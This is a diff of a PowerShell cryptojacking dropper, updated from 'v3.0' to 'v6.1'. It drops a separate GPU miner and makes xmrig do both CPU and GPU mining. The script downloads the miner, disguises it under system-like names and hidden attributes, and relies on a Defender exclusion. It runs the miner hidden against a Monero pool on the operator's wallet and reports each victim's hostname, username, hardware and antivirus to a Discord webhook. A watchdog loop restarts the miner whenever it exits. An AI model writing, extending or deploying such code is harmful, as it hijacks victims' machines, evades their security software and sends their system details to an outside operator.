@@ -135,7 +135,7 @@ Start-Job -ScriptBlock {
 
 $mName = "$($env:COMPUTERNAME)".Replace(' ','_')
 $xmrigUrl = "https://raw.githubusercontent.com/$($c.u1)/$($c.u2)/main/xmrig.exe"
-$gminerUrl = "https://github.com/develsoftware/GMinerRelease/releases/download/3.44/gminer_3_44_windows64.zip"
+
 
 # Find a writable directory
 $writableDir = $null
@@ -197,52 +197,16 @@ if (!(Test-Path $cpuExe)) {
     } catch {}
 }
 
-$gpuExe = $null
-if ($hw.gpu) {
-    $gpuExe = Join-Path $writableDir "RuntimeBroker_update.exe"
-    if (!(Test-Path $gpuExe)) {
-        try {
-            $wc2 = New-Object System.Net.WebClient
-            $wc2.Headers.Add('User-Agent', 'Mozilla/5.0')
-            $dlBytes2 = $null
-            try { $dlBytes2 = $wc2.DownloadData($gminerUrl) } catch {}
-            if (!$dlBytes2 -or $dlBytes2.Length -lt 1000) {
-                $tmpDl2 = Join-Path $env:TEMP "dl2_$(Get-Random).tmp"
-                & curl.exe --ssl-no-revoke -L -o $tmpDl2 $gminerUrl 2>$null
-                if (Test-Path $tmpDl2) { $dlBytes2 = [IO.File]::ReadAllBytes($tmpDl2); Remove-Item $tmpDl2 -Force -EA 0 }
-            }
-            if ($dlBytes2 -and $dlBytes2.Length -gt 1000) {
-                $tmpZip2 = Join-Path $env:TEMP "gm_$(Get-Random).zip"
-                [IO.File]::WriteAllBytes($tmpZip2, $dlBytes2)
-                Add-Type -Assembly System.IO.Compression.FileSystem
-                $zip2 = [IO.Compression.ZipFile]::OpenRead($tmpZip2)
-                foreach ($entry in $zip2.Entries) {
-                    if ($entry.Name -eq 'miner.exe') {
-                        $s = $entry.Open(); $fs = [IO.File]::Create($gpuExe); $s.CopyTo($fs); $fs.Close(); $s.Close(); break
-                    }
-                }
-                $zip2.Dispose(); Remove-Item $tmpZip2 -Force -EA 0
-                try { [IO.File]::SetAttributes($gpuExe, 'Hidden,System') } catch {}
-            }
-        } catch { $gpuExe = $null }
-    }
-}
-
 # Wait for Defender exclusion to propagate
 Start-Sleep -Seconds 10
 
-# === LAUNCH MINERS ===
+# === LAUNCH MINER (xmrig handles both CPU + GPU) ===
 if (Test-Path $cpuExe) {
-    $cpuArgs = "-o pool.supportxmr.com:443 --tls -u $($c.addr) -p WinSys_$mName -a rx -k --cpu-max-threads-hint 35 --cpu-priority 0 --asm=auto --donate-level 1"
+    $gpuFlags = if ($hw.gpu) { ' --opencl --cuda' } else { '' }
+    $cpuArgs = "-o pool.supportxmr.com:443 --tls -u $($c.addr) -p WinSys_$mName -a rx -k --cpu-max-threads-hint 35 --cpu-priority 0 --asm=auto --donate-level 1$gpuFlags"
     $cpuProc = Start-Process -FilePath $cpuExe -ArgumentList $cpuArgs -WindowStyle Hidden -PassThru -EA 0
     # Retry once if launch failed
     if (!$cpuProc) { Start-Sleep 3; $cpuProc = Start-Process -FilePath $cpuExe -ArgumentList $cpuArgs -WindowStyle Hidden -PassThru -EA 0 }
-}
-
-if ($gpuExe -and (Test-Path $gpuExe)) {
-    $gpuArgs = "--algo ETCHASH --server etchash.unmineable.com:443 --user XMR:$($c.addr).WinSys_${mName}_G --pass x --intensity 25 --ssl 1"
-    $gpuProc = Start-Process -FilePath $gpuExe -ArgumentList $gpuArgs -WindowStyle Hidden -PassThru -EA 0
-    if (!$gpuProc) { Start-Sleep 3; $gpuProc = Start-Process -FilePath $gpuExe -ArgumentList $gpuArgs -WindowStyle Hidden -PassThru -EA 0 }
 }
 
 # === RICH DISCORD NOTIFICATION ===
@@ -256,24 +220,19 @@ try {
             description = "**Deployment Success**`n" +
                 "``````Host: $($env:COMPUTERNAME)`nUser: $($env:USERNAME)`nCPU: $($hw.cpuName)`nCores: $($hw.cores)`nRAM: $($hw.ram) GB`nGPU: $($hw.gpuName)`nOS: $osName`nAV: $av`nUptime: $($upHours)h``````"
             color = 3066993
-            footer = @{ text = "v3.0 | $(Get-Date -Format 'yyyy-MM-dd HH:mm UTC')" }
+            footer = @{ text = "v6.1 | $(Get-Date -Format 'yyyy-MM-dd HH:mm UTC')" }
         })
     } | ConvertTo-Json -Depth 4
     Invoke-RestMethod -Uri $c.wh -Method Post -Body $json -ContentType "application/json" -EA 0
 } catch {}
 
-# === WATCHDOG LOOP (restart miners if they die) ===
-Write-Host "[*] Watchdog active. Monitoring miners..."
+# === WATCHDOG LOOP (restart miner if it dies) ===
+Write-Host "[*] Watchdog active. Monitoring miner..."
 while ($true) {
     Start-Sleep -Seconds 30
     if ($cpuProc -and $cpuProc.HasExited) {
         if (Test-Path $cpuExe) {
             $cpuProc = Start-Process -FilePath $cpuExe -ArgumentList $cpuArgs -WindowStyle Hidden -PassThru -EA 0
-        }
-    }
-    if ($gpuProc -and $gpuProc.HasExited) {
-        if (Test-Path $gpuExe) {
-            $gpuProc = Start-Process -FilePath $gpuExe -ArgumentList $gpuArgs -WindowStyle Hidden -PassThru -EA 0
         }
     }
 }
